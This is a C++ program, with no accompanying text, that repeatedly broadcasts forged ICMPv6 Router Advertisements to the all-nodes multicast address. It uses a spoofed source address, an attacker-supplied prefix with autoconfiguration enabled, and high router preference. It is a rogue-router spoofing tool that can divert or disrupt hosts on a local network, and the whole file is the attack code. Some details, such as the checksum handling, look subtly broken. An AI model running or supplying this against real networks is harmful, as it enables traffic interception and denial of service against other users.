#include <iostream>
#include <cstring>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>

#define ND_RA_FLAG_RTPREF_HIGH 0x08

struct nd_opt_slla {
    struct nd_opt_hdr hdr;
    uint8_t hw_addr[6];
};

int main(int argc, char* argv[]) {
    // Usage: <hw_addr> <src_addr> <prefix> <prefix_len> <if_name> <sleep_seconds>
    if (argc != 7) {
        return 1;
    }

    double sleep_duration = atof(argv[6]);

    while (1) {
        int sock = socket(PF_INET6, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            return 1;
        }
        if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, argv[5], std::strlen(argv[5])) < 0) {
            return 1;
        }

        struct sockaddr_in6 src_addr, dest_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        memset(&dest_addr, 0, sizeof(dest_addr));

        src_addr.sin6_family = AF_INET6;
        dest_addr.sin6_family = AF_INET6;
        inet_pton(AF_INET6, argv[2], &src_addr.sin6_addr);  // Spoofed source address
        inet_pton(AF_INET6, "ff02::1", &dest_addr.sin6_addr);  // All-nodes multicast address

        struct ip6_hdr ip_header;
        memset(&ip_header, 0, sizeof(ip_header));
        ip_header.ip6_ctlun.ip6_un1.ip6_un1_flow = htonl((6 << 28) | (0 << 20) | 0);
        ip_header.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(struct nd_router_advert) + sizeof(struct nd_opt_prefix_info) + sizeof(struct nd_opt_slla));
        ip_header.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
        ip_header.ip6_ctlun.ip6_un1.ip6_un1_hlim = 255;
        ip_header.ip6_src = src_addr.sin6_addr;
        ip_header.ip6_dst = dest_addr.sin6_addr;

        struct nd_router_advert icmp_header;
        memset(&icmp_header, 0, sizeof(icmp_header));
        icmp_header.nd_ra_hdr.icmp6_type = ND_ROUTER_ADVERT;
        icmp_header.nd_ra_hdr.icmp6_code = 0;
        icmp_header.nd_ra_router_lifetime = 0;
        icmp_header.nd_ra_flags_reserved = ND_RA_FLAG_RTPREF_HIGH;
        icmp_header.nd_ra_curhoplimit = 255;

        struct nd_opt_slla opt_slla;
        opt_slla.hdr.nd_opt_type = ND_OPT_SOURCE_LINKADDR;
        opt_slla.hdr.nd_opt_len = 1;

        sscanf(argv[1], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &opt_slla.hw_addr[0], &opt_slla.hw_addr[1], &opt_slla.hw_addr[2],
               &opt_slla.hw_addr[3], &opt_slla.hw_addr[4], &opt_slla.hw_addr[5]);

        struct nd_opt_prefix_info prefix_info;
        memset(&prefix_info, 0, sizeof(prefix_info));
        prefix_info.nd_opt_pi_type = ND_OPT_PREFIX_INFORMATION;
        prefix_info.nd_opt_pi_len = sizeof(prefix_info) / 8;
        prefix_info.nd_opt_pi_prefix_len  = std::atoi(argv[4]);
        prefix_info.nd_opt_pi_flags_reserved = ND_OPT_PI_FLAG_ONLINK | ND_OPT_PI_FLAG_AUTO;
        prefix_info.nd_opt_pi_valid_time = htonl(86400);
        prefix_info.nd_opt_pi_preferred_time = htonl(14400);
        inet_pton(AF_INET6, argv[3], &prefix_info.nd_opt_pi_prefix.s6_addr);

        struct {
            struct in6_addr src;
            struct in6_addr dst;
            uint32_t len;
            uint8_t zeros[3];
            uint8_t next_hdr;
        } pseudo_header;

        memset(&pseudo_header, 0, sizeof(pseudo_header));
        pseudo_header.src = src_addr.sin6_addr;
        pseudo_header.dst = dest_addr.sin6_addr;
        pseudo_header.len = htonl(sizeof(icmp_header) + sizeof(prefix_info) + sizeof(opt_slla));
        pseudo_header.next_hdr = IPPROTO_ICMPV6;

        char icmp_buf[sizeof(icmp_header) + sizeof(prefix_info) + sizeof(opt_slla)];
        memcpy(icmp_buf, &icmp_header, sizeof(icmp_header));
        memcpy(icmp_buf + sizeof(icmp_header), &prefix_info, sizeof(prefix_info));
        memcpy(icmp_buf + sizeof(icmp_header) + sizeof(prefix_info), &opt_slla, sizeof(opt_slla));

        uint32_t sum = 0;
        uint16_t* ptr = (uint16_t*)&pseudo_header;
        for (int i = 0; i < sizeof(pseudo_header) / 2; i++) {
            sum += ntohs(ptr[i]);
        }
        ptr = (uint16_t*)icmp_buf;
        for (int i = 0; i < (sizeof(icmp_buf) + 1) / 2; i++) {
            sum += ntohs(ptr[i]);
        }
        while (sum >> 16) {
            sum = (sum & 0xffff) + (sum >> 16);
        }
        icmp_header.nd_ra_hdr.icmp6_cksum = htons(~sum);

        char buf[sizeof(ip_header) + sizeof(icmp_header) + sizeof(prefix_info) + sizeof(opt_slla)];
        memcpy(buf, &ip_header, sizeof(ip_header));
        memcpy(buf + sizeof(ip_header), &icmp_header, sizeof(icmp_header));
        memcpy(buf + sizeof(ip_header) + sizeof(icmp_header), &prefix_info, sizeof(prefix_info));
        memcpy(buf + sizeof(ip_header) + sizeof(icmp_header) + sizeof(prefix_info), &opt_slla, sizeof(opt_slla));

        if (sendto(sock, buf, sizeof(buf), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            return 1;
        }

        sleep((unsigned int)sleep_duration);
    }

    return 0;
}